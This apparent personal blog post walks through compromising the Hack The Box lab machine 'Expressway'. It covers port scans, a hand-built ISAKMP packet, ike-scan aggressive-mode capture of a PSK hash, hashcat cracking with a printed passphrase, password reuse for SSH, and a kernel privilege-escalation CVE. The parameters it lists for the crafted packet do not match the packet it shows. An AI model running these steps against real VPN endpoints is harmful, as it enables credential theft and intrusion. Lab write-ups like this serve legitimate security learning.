+++
date = '2026-09-07T21:16:16+01:00'
draft = true
title = 'Expressway'
+++
## Introduction

Expressway is an easy difficulty, Linux based machine hosted by hack the box. It is a retired machine meaning I can publish this blog and talk through how I was able to gain root access. This machine required me to explore IPSec, IKE and ISAKMP, all of which make up a suite of tools for securing traffic over the internet. To gain access at the user level, a flaw in IKEv1 is exploited to crack shared secrets between the user and a VPN server. For escalation to the root user, a recent kernel level exploit is used to gain full machine compromise.

## Enumeration

To begin working on the expressway machine, I started by performing a TCP port scan of all ports. After only finding Port 22 (SSH), I ran nmap again with version information and scripts enabled to help uncover some more information.
```
nmap -T4 -sC -sV expressway.htb

Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-07 17:05 -0400                                            
Nmap scan report for expressway.htb (10.129.238.52)                                                          
Host is up (0.014s latency).                                                                                 
Not shown: 999 closed tcp ports (reset)                                                                      
PORT   STATE SERVICE VERSION                                                                                 
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)                                                  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                      
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .               
Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```
Having only found SSH and ruling out any easy exploits based on the version of OpenSSH presented, I decided to explore the UDP ports available on the machine. The results returned isakmp which I've encountered before in a previous piece of work. I knew it was associated with the protocols available for VPN connections. I took some time to research isakmp since I suspected this would be the crux to beating this machine.
```
sudo nmap -T4 -sU -sV -sC expressway.htb

[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-07 17:27 -0400
Stats: 0:05:13 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 40.55% done; ETC: 17:40 (0:07:39 remaining)
Nmap scan report for expressway.htb (10.129.238.52)
Host is up (0.014s latency).
Not shown: 935 closed udp ports (port-unreach), 64 open|filtered udp ports (no-response)
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
| fingerprint-strings: 
|   IKE_MAIN_MODE: 
|_    "3DUfw
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

## ISAKMP, IPSec and IKE

Before continuing down the rabbit hole of the technology in use in this machine, I had to get my head around the terminology being used here.

- ISAKMP = Internet Security Association and Key Management Protocol

- This can be thought of as a framework that allows for security associations to be established between two TCP/IP devices/endpoints that would like to talk using some form of authenticity, integrity and/or confidentiality.

- IPSec = Internet Protocol Security

- If ISAKMP is the framework for establishing security associations, IPSec refers instead to the actual mechanisms used to authenticate and maintain confidentiality of information being transmitted across a LAN or VPN.

- IKE = Internet Key Exchange

- This term specifically references the key exchange tools used by two endpoints to securely negotiate shared secrets without exposing any sensitive or cryptographically important information over a network.

Whilst all the definitions above form part of the bigger process of VPN security, they all refer to distinct technologies that will be seen throughout the exploitation of this machine.

## Exploring ISAKMP

Before getting too invested into UDP Port 500, I wanted to quickly confirm that the endpoint was actually using ISAKMP. Initially, I did this manually by crafting a basic ISAKMP data packet and sending it to UDP Port 500. The ISAKMP packet structure is documented in the standard RFC 2408. A framework of the packet can be seen below.  
```
                     1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    !                          Initiator                            !
    !                            Cookie                             !
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    !                          Responder                            !
    !                            Cookie                             !
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    !  Next Payload ! MjVer ! MnVer ! Exchange Type !     Flags     !
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    !                          Message ID                           !
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    !                            Length                             !
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Using the above format, a basic ISAKMP packet can be created. This packet below has an initiator cookie of 7 empty bytes followed by 0x01 to identify that the initiator is myself. The responder cookie is left as 8 bytes of all zeros since this will be populated by the ISAKMP server. The next payload byte is 0x01 to tell the message parser that the next payload is a Security Association. Next is version information, which can be shown by the byte 0x10 to indicate version 1.0 alongside the exchange type, which is set to 0x02, meaning the exchange is using the Main Mode setting (this will be useful later). The flags value here is also left blank as 0x00. To complete the message header, a message ID of 4 0x00 bytes and a length for the whole packet is covered in the next 4 bytes.

Now that the header of the packet is complete, a Security Association is needed. The remainder of the packet encodes the following security association in RFC 2408 format. The contents of this security association is purposefully using outdated Hash, Encryption and Diffie-Hellman parameters for maximum compatibility with the ISAKMP endpoint.

- Hash: SHA-256 or SHA-384
- Encryption: AES-256-CBC or AES-256-GCM
- DH Group: Group 14 (2048-bit) or higher

```
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    | Next Payload  |   RESERVED    |         Payload Length        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |              Domain of Interpretation (DOI)                   |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                          Situation                            |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                                                               |
    ~                       Proposal Payloads                       ~
    |                                                               |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

The final packet can be seen below and is sent towards the target using netcat. The interaction can then be monitored using Wireshark to see if the ISAKMP server responds.

```bash
$ ISAKMP_PACKET="\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x30\x01\x01\x00\x01\x00\x00\x00\x28\x01\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x00\x80\x80\x02\x00\x02\x80\x04\x00\x05\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x01\x51\x80"

$ echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u TARGET_IP 500 | hexdump -C
```

After the test packet is sent, a new payload is collected from netcat and therefore confirms that the expressway server is hosting a ISAKMP endpoint.

```bash
$ echo -ne "$ISAKMP_PACKET" | timeout 5 nc -u expressway.htb 500 | hexdump -C
00000000  00 00 00 00 00 00 00 01  10 ff 52 f4 7a e2 28 69  |..........R.z.(i|
00000010  0b 10 05 00 5c cc 0d 13  00 00 00 38 00 00 00 1c  |....\......8....|
00000020  00 00 00 01 01 10 00 0e  00 00 00 00 00 00 00 01  |................|
00000030  10 ff 52 f4 7a e2 28 69                           |..R.z.(i|
00000038
```

## IKE-Scan

Whilst continuing my research into testing of ISAKMP and Internet Key Exchange, I came across a tool called IKE-Scan. The tool can enumerate the versions of IKE used by the endpoint and can also perform the IKE in 'Aggressive Mode'.

Aggressive mode is the crux to attacking this machine. When aggressive mode is enabled over 'Main Mode', the security association and key exchange process is reduced from 6 packets down to 3 packets. This feature was intended to speed up the process of establishing an authenticated channel. However, as an unintended consequence, it sacrifices the privacy and weakens the security of the Internet Key Exchange. To get the exchange down to just 3 packets, the Security Associations, Diffie-Hellman public values and local identity values are all bundled into 1 packet. Similarly, the responding server also bundles up public key values, alongside identity data and a cryptographic hash for authentication. Not only are the identity values useful for finding VPN endpoints, but the cryptographic hashes can be taken away and cracked offline, making aggressive mode a massive security flaw.

To understand whether the expressway server is vulnerable to aggressive mode exchanges, IKE-Scan was run in aggressive mode, and the output was recorded. Any PSK-relevent values were recorded to the file pskhash.txt.

```bash
$ ike-scan -A expressway.htb --pskcrack=pskhash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=b9da893993e675f6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.020 seconds (48.96 hosts/sec).  1 returned handshake; 0 returned notify

$ cat pskhash1.txt
0b2e88952fbe88755528fdc35a8514606a9acf6ec3055dc5f45bd4e66db51a4add73d37c5e4c39086207ae9b5eed99a1f2204d6e20e8b3426b2910a2022ff529c368c3c5753303e7dde7a1af35d594e4ff6c04cdcbcf6dafbc1459c476a5088ebda4313058d4d5e2cf876965a6a2549fe79fa65430bd175ecad3dabf3743d77b:55e17aa5b9fca950dd31d42fa32ebf9564fce6a106e428f4d7a01b96cf44cd5a4c1ae4322f3a732869623bd367cff4f46c485832789aa8c6943ceb5e4bc60a03bba2df5a92c72272caa7d18c34501de5d2c35c0551cd12387cbcf1e0bb1d56aeeb7fd9becb6225b956d1381b3163aab4e14afabde04adf3a8f3266defdb808c9:b9da893993e675f6:3a685d0d624fdf59:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf5aa1781dcd63959137ccf4afffcac2d4486f88:ece1537777121520eccfe8c4b7e9d19dcf31f9907b8a3732b1d6291e101c728f:06eca0564c20f7a00a79f5c5cc3897b892622fc6
```

## PSK Cracking

With the pre-shared key captured, attempts can be made to crack it offline. Hashcat can parse the output of IKE-Scan pskhash.txt and will perform a dictionary-style attack to try to break the PSK. In this scenario, the PSK is part of the rockyou.txt passphrase list and hashcat is able to crack it within a few seconds.

```bash
$ hashcat pskhash.txt /usr/share/wordlists/rockyou.txt

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!

Do NOT report auto-detect issues unless you are certain of the hash type.

36c7d.....183c:freakingrockstarontheroad
```

## Login as Ike

With a passphrase in hand for the VPN, I decided to test my luck to log in as Ike via SSH. In this scenario it paid off since the PSK for Ike's VPN is the same as their SSH login. I now had a user login to the expressway machine. This exposed the user hash for this machine in Ike's home directory.

```bash
ike@expressway:~$ cat user.txt
df75******************************
```

## Priviledge Escalation

I began my enumeration of the Ike users' files and sudo privileges however the users area was quite bare. I decided instead to check out the kernel version of the box to see if there were any kernel vulnerabilities that could be exploited.

```bash
ike@expressway:~$ uname -a
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux
```

This kernel version is affected by kernel-level privilege escalation vulnerability CVE-2026-31431 more commonly known as 'Copy Fail'. This CVE makes use of page caching and the algif_aead Linux kernel module. A flaw in the algif_aead, which is a module that lets user-space applications request the use of cryptographic operations, allowed users to write into the page cache. The page cache contains binaries and other data that is commonly used and makes a copy of them in RAM for increased speed over reading them from disc. By chaining these two features together, a write can be made specifically to a critical binary like /usr/bin/su and force it to act as if it was invoked by a root user, therefore allowing an unprivileged user to switch to a root user. 

To use this exploit, I found an existing Python POC that I could host from my computer and transferred it into the expressway machine as the Ike user. From there, I ran the Python script which successfully transitioned my user-level account to the root user.

```bash
root@expressway:/# cat root/root.txt
6b8b****************************
```

## Conclusion

Expressway was an enjoyable machine to practise my skills and knowledge against. Whilst I had seen IPSec as part of a different project, it was great to go into more depth on the payload formats and it's features that can lead to exploitation. I was glad I was able to find the UDP Port 500 early to prevent going down any rabbit holes, and the use of manual payload crafting to test TCP/UDP ports is a skill I will undoubtedly use again. Finally, learning more about one of the recent (2026) Linux kernel privilege escalation CVEs will keep me up to date with the latest escalation vectors and improve my knowledge of how the Linux kernel actually operates.